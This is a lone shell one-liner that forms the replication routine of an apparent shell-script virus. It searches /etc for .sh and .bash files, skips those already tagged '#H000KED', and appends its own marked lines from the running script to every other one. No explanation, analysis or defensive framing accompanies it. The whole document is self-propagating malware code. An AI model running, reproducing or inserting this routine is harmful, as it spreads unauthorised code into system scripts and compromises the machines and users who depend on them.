for i in $( find /etc 2> /dev/null | grep -i "\.bash\$\|\.sh\$" ); do if ( fgrep "\#H000KED" $i > /dev/null ); then continue; fi; echo >> $i; cat $0 | grep \#H000KED >> $i; done;
